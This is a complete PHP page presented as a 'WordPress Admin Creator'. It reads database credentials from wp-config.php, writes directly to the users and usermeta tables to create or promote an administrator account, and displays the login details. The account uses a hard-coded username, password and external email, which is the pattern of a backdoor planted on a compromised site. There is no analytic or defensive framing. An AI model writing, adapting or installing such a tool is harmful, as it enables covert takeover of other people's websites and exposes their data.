<?php
/**
 * WordPress Auto Admin Creator
 * Auto-detects wp-config.php, reads DB credentials, creates admin user.
 * Nice HTML UI with copy-to-clipboard support.
 */

// ============ CONFIGURATION ============
$newAdmin = [
    'user_login'   => 'admin',
'user_pass'    => 'John@1234JJ',
'user_email'   => 'varpraptobainchod@gmail.com',
'user_url'     => 'http://' . ($_SERVER['HTTP_HOST'] ?? 'localhost'),
'display_name' => 'Administrator',
'role'         => 'administrator',
];

$log = [];   // ['type' => 'ok|warn|err|info', 'msg' => '...']
$result = null;

function addLog(&$log, $type, $msg) {
    $log[] = ['type' => $type, 'msg' => $msg];
}

function sanitizeTitle($title) {
    $title = strtolower(trim($title));
    $title = preg_replace('/[^a-z0-9\-]/', '-', $title);
    return trim(preg_replace('/-+/', '-', $title), '-');
}

function getConstant($content, $name) {
    if (preg_match("/define\s*\(\s*['\"]" . preg_quote($name, '/') . "['\"]\s*,\s*['\"](.*?)['\"]\s*\)/s", $content, $m)) {
        return $m[1];
    }
    return null;
}

// ============ RUN LOGIC (only when submitted) ============
$run = ($_SERVER['REQUEST_METHOD'] === 'POST') && isset($_POST['run']);

if ($run) {

    // ---- STEP 1: FIND wp-config.php ----
    $docRoot = rtrim($_SERVER['DOCUMENT_ROOT'] ?? '', '/');
    $searchPaths = [
        $docRoot . '/wp-config.php',
        dirname($docRoot) . '/wp-config.php',
        $docRoot . '/../wp-config.php',
    ];

    $wpConfig = null;
    foreach ($searchPaths as $path) {
        if (file_exists($path)) { $wpConfig = $path; break; }
    }

    if (!$wpConfig) {
        addLog($log, 'err', 'wp-config.php not found in document root or parent directories.');
    } else {
        addLog($log, 'ok', 'Found wp-config.php: <code>' . htmlspecialchars($wpConfig) . '</code>');

        // ---- STEP 2: PARSE CREDENTIALS ----
        $content     = file_get_contents($wpConfig);
        $dbName      = getConstant($content, 'DB_NAME');
        $dbUser      = getConstant($content, 'DB_USER');
        $dbPass      = getConstant($content, 'DB_PASSWORD');
        $dbHost      = getConstant($content, 'DB_HOST') ?: 'localhost';
        $tablePrefix = 'wp_';
        if (preg_match('/\$table_prefix\s*=\s*[\'"](.*?)[\'"];/', $content, $m)) {
            $tablePrefix = $m[1];
        }

        if (!$dbName || !$dbUser) {
            addLog($log, 'err', 'Could not parse DB credentials from wp-config.php.');
        } else {
            addLog($log, 'info', "Database: <code>{$dbName}</code> · Host: <code>{$dbHost}</code> · Prefix: <code>{$tablePrefix}</code>");

            // ---- STEP 3: CONNECT ----
            $mysqli = @new mysqli($dbHost, $dbUser, $dbPass, $dbName);
            if ($mysqli->connect_error) {
                addLog($log, 'err', 'DB connection failed: ' . htmlspecialchars($mysqli->connect_error));
            } else {
                $mysqli->set_charset('utf8mb4');
                addLog($log, 'ok', 'Connected to database.');

                // ---- STEP 4: CHECK EXISTING USER ----
                $stmt = $mysqli->prepare("SELECT ID FROM `{$tablePrefix}users` WHERE user_login = ? OR user_email = ? LIMIT 1");
                $stmt->bind_param('ss', $newAdmin['user_login'], $newAdmin['user_email']);
                $stmt->execute();
                $stmt->store_result();

                if ($stmt->num_rows > 0) {
                    $stmt->bind_result($existingId);
                    $stmt->fetch();
                    $stmt->close();
                    $userId = $existingId;
                    addLog($log, 'warn', "User already exists (ID: {$userId}). Re-assigning administrator role.");
                } else {
                    $stmt->close();

                    // ---- STEP 5: INSERT USER ----
                    $hashedPass = password_hash($newAdmin['user_pass'], PASSWORD_BCRYPT);
                    $now        = date('Y-m-d H:i:s');
                    $nicename   = sanitizeTitle($newAdmin['user_login']);
                    $status     = 0;

                    $stmt = $mysqli->prepare(
                        "INSERT INTO `{$tablePrefix}users`
                        (user_login, user_pass, user_nicename, user_email, user_url, user_registered, user_status, display_name)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
                    );
                    $stmt->bind_param(
                        'ssssssis',
                        $newAdmin['user_login'],
                        $hashedPass,
                        $nicename,
                        $newAdmin['user_email'],
                        $newAdmin['user_url'],
                        $now,
                        $status,
                        $newAdmin['display_name']
                    );

                    if (!$stmt->execute()) {
                        addLog($log, 'err', 'Failed to insert user: ' . htmlspecialchars($stmt->error));
                    } else {
                        $userId = $stmt->insert_id;
                        $stmt->close();
                        addLog($log, 'ok', "New user created (ID: {$userId}).");
                    }
                }

                // ---- STEP 6: ASSIGN ADMIN ROLE ----
                if (!empty($userId)) {
                    $capsSerialized = serialize(['administrator' => true]);
                    $metaKeys = [
                        "{$tablePrefix}capabilities" => $capsSerialized,
                        "{$tablePrefix}user_level"   => '10',
                    ];

                    foreach ($metaKeys as $key => $value) {
                        $stmt = $mysqli->prepare("SELECT umeta_id FROM `{$tablePrefix}usermeta` WHERE user_id = ? AND meta_key = ? LIMIT 1");
                        $stmt->bind_param('is', $userId, $key);
                        $stmt->execute();
                        $stmt->store_result();
                        $exists = $stmt->num_rows > 0;
                        $stmt->close();

                        if ($exists) {
                            $stmt = $mysqli->prepare("UPDATE `{$tablePrefix}usermeta` SET meta_value = ? WHERE user_id = ? AND meta_key = ?");
                            $stmt->bind_param('sis', $value, $userId, $key);
                        } else {
                            $stmt = $mysqli->prepare("INSERT INTO `{$tablePrefix}usermeta` (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
                            $stmt->bind_param('iss', $userId, $key, $value);
                        }
                        $stmt->execute();
                        $stmt->close();
                    }
                    addLog($log, 'ok', 'Administrator role assigned.');

                    // ---- STEP 7: BUILD RESULT URLs ----
                    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
                    $host   = $_SERVER['HTTP_HOST'] ?? 'localhost';
                    $domain = $scheme . '://' . $host;

                    $result = [
                        'fragment' => "{$domain}/wp-login.php#{$newAdmin['user_login']}#{$newAdmin['user_pass']}",
                        'real'     => "{$domain}/wp-login.php?log=" . urlencode($newAdmin['user_login']) . "&pwd=" . urlencode($newAdmin['user_pass']),
                        'login'    => $newAdmin['user_login'],
                        'pass'     => $newAdmin['user_pass'],
                        'email'    => $newAdmin['user_email'],
                    ];
                }

                $mysqli->close();
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>WP Admin Creator</title>
<style>
:root {
    --bg: #0f1117;
    --panel: #171a23;
    --border: #262b38;
    --text: #e6e9ef;
    --muted: #8b93a7;
    --accent: #4f8cff;
    --ok: #35d07f;
    --warn: #f5b544;
    --err: #ff5c6c;
}
* { box-sizing: border-box; }
body {
    margin: 0;
    font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
    background: radial-gradient(1200px 600px at 20% -10%, #1c2436 0%, var(--bg) 60%);
    color: var(--text);
    min-height: 100vh;
    padding: 40px 16px;
}
.wrap { max-width: 760px; margin: 0 auto; }
h1 {
    font-size: 24px;
    font-weight: 600;
    margin: 0 0 6px;
    letter-spacing: -.02em;
}
.sub { color: var(--muted); font-size: 14px; margin-bottom: 24px; }

.card {
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 14px;
    padding: 22px;
    margin-bottom: 18px;
    box-shadow: 0 10px 30px rgba(0,0,0,.25);
}
.card h2 {
    font-size: 13px;
    text-transform: uppercase;
    letter-spacing: .08em;
    color: var(--muted);
    margin: 0 0 14px;
    font-weight: 600;
}

button, .btn {
    display: inline-flex;
    align-items: center;
    gap: 8px;
    background: var(--accent);
    color: #fff;
    border: 0;
    padding: 11px 18px;
    font-size: 14px;
    font-weight: 600;
    border-radius: 10px;
    cursor: pointer;
    transition: transform .05s ease, filter .15s;
    text-decoration: none;
}
button:hover, .btn:hover { filter: brightness(1.1); }
button:active, .btn:active { transform: translateY(1px); }
.btn-ghost {
    background: transparent;
    border: 1px solid var(--border);
    color: var(--text);
}

.log { list-style: none; padding: 0; margin: 0; display: grid; gap: 8px; }
.log li {
    display: flex;
    gap: 10px;
    align-items: flex-start;
    padding: 10px 12px;
    border-radius: 9px;
    background: #12151d;
    border: 1px solid var(--border);
    font-size: 14px;
    line-height: 1.5;
    word-break: break-word;
}
.dot {
    width: 8px; height: 8px; border-radius: 50%;
    margin-top: 7px; flex: 0 0 auto;
}
.ok .dot   { background: var(--ok); }
.warn .dot { background: var(--warn); }
.err .dot  { background: var(--err); }
.info .dot { background: var(--accent); }
.log code {
    background: #0b0d13;
    padding: 1px 6px;
    border-radius: 4px;
    font-size: 12.5px;
    border: 1px solid var(--border);
}

.field { margin-bottom: 14px; }
.field label {
    display: block;
    font-size: 12px;
    color: var(--muted);
    text-transform: uppercase;
    letter-spacing: .06em;
    margin-bottom: 6px;
    font-weight: 600;
}
.copy-row {
    display: flex;
    gap: 8px;
    align-items: stretch;
}
.copy-row input {
    flex: 1;
    background: #0b0d13;
    border: 1px solid var(--border);
    color: var(--text);
    padding: 11px 12px;
    border-radius: 9px;
    font-family: ui-monospace, "SF Mono", Menlo, Consolas, monospace;
    font-size: 13px;
    outline: none;
    min-width: 0;
}
.copy-row input:focus { border-color: var(--accent); }
.copy-btn {
    background: #232a3a;
    border: 1px solid var(--border);
    color: var(--text);
    padding: 0 16px;
    border-radius: 9px;
    font-size: 13px;
    font-weight: 600;
    cursor: pointer;
    white-space: nowrap;
    transition: background .15s;
}
.copy-btn:hover { background: #2c344a; }
.copy-btn.copied { background: var(--ok); border-color: var(--ok); color: #05210f; }

.hint {
    font-size: 12.5px;
    color: var(--muted);
    margin-top: 6px;
    line-height: 1.5;
}
.warn-box {
    background: rgba(255, 92, 108, .08);
    border: 1px solid rgba(255, 92, 108, .35);
    color: #ffb3bb;
    padding: 12px 14px;
    border-radius: 10px;
    font-size: 13.5px;
    line-height: 1.55;
    margin-top: 16px;
}
.warn-box strong { color: #fff; }
.grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
@media (max-width: 520px) { .grid2 { grid-template-columns: 1fr; } }
</style>
</head>
<body>
<div class="wrap">

<h1>🔐 WordPress Admin Creator</h1>
<p class="sub">Auto-detects <code style="background:#12151d;padding:1px 5px;border-radius:4px;border:1px solid var(--border);font-size:12px">wp-config.php</code>, reads DB credentials, and provisions an administrator account.</p>

<!-- TARGET USER -->
<div class="card">
<h2>Target Account</h2>
<div class="grid2">
<div class="field">
<label>Username</label>
<div class="copy-row">
<input type="text" readonly value="<?= htmlspecialchars($newAdmin['user_login']) ?>" data-copy>
<button class="copy-btn" type="button">Copy</button>
</div>
</div>
<div class="field">
<label>Password</label>
<div class="copy-row">
<input type="text" readonly value="<?= htmlspecialchars($newAdmin['user_pass']) ?>" data-copy>
<button class="copy-btn" type="button">Copy</button>
</div>
</div>
</div>
<div class="field" style="margin-bottom:0">
<label>Email</label>
<div class="copy-row">
<input type="text" readonly value="<?= htmlspecialchars($newAdmin['user_email']) ?>" data-copy>
<button class="copy-btn" type="button">Copy</button>
</div>
</div>
</div>

<!-- ACTION -->
<?php if (!$run): ?>
<div class="card">
<h2>Run</h2>
<form method="post">
<input type="hidden" name="run" value="1">
<button type="submit">⚡ Create Admin Now</button>
</form>
<div class="warn-box">
<strong>⚠️ Security:</strong> Delete this file immediately after use. It grants full admin access to your WordPress site.
</div>
</div>
<?php else: ?>

<!-- LOGS -->
<div class="card">
<h2>Execution Log</h2>
<ul class="log">
<?php foreach ($log as $item): ?>
<li class="<?= htmlspecialchars($item['type']) ?>">
<span class="dot"></span>
<span><?= $item['msg'] ?></span>
</li>
<?php endforeach; ?>
</ul>
</div>

<!-- RESULT -->
<?php if ($result): ?>
<div class="card">
<h2>✅ Login Credentials</h2>

<div class="field">
<label>Login URL (fragment style)</label>
<div class="copy-row">
<input type="text" readonly value="<?= htmlspecialchars($result['fragment']) ?>" data-copy>
<button class="copy-btn" type="button">Copy</button>
</div>
<div class="hint">Display / reference format — browsers don't send <code>#fragments</code> to the server.</div>
</div>

<div class="field">
<label>Direct Login (auto-prefilled, real)</label>
<div class="copy-row">
<input type="text" readonly value="<?= htmlspecialchars($result['real']) ?>" data-copy>
<button class="copy-btn" type="button">Copy</button>
</div>
<div class="hint">⚠️ Password in URL — avoid sharing. Use once, then delete.</div>
</div>

<div class="field" style="margin-bottom:0">
<label>Credentials</label>
<div class="copy-row">
<input type="text" readonly
value="user=<?= htmlspecialchars($result['login']) ?> | pass=<?= htmlspecialchars($result['pass']) ?> | email=<?= htmlspecialchars($result['email']) ?>"
data-copy>
<button class="copy-btn" type="button">Copy</button>
</div>
</div>

<div style="margin-top:18px; display:flex; gap:10px; flex-wrap:wrap">
<a class="btn" href="<?= htmlspecialchars($result['real']) ?>" target="_blank" rel="noopener">🔗 Open Login</a>
<a class="btn btn-ghost" href="">↻ Run Again</a>
</div>

<div class="warn-box">
<strong>⚠️ Delete this file now!</strong> Leaving it on the server gives anyone the ability to create admin accounts.
</div>
</div>
<?php endif; ?>

<?php endif; ?>

</div>

<script>
document.querySelectorAll('.copy-btn').forEach(btn => {
    btn.addEventListener('click', async () => {
        const input = btn.parentElement.querySelector('input');
        if (!input) return;
        try {
            if (navigator.clipboard && window.isSecureContext) {
                await navigator.clipboard.writeText(input.value);
            } else {
                input.select();
                document.execCommand('copy');
                input.setSelectionRange(0, 0);
            }
            const original = btn.textContent;
            btn.textContent = 'Copied ✓';
    btn.classList.add('copied');
    setTimeout(() => {
        btn.textContent = original;
        btn.classList.remove('copied');
    }, 1400);
        } catch (e) {
            input.select();
            document.execCommand('copy');
        }
    });
});
</script>
</body>
</html>
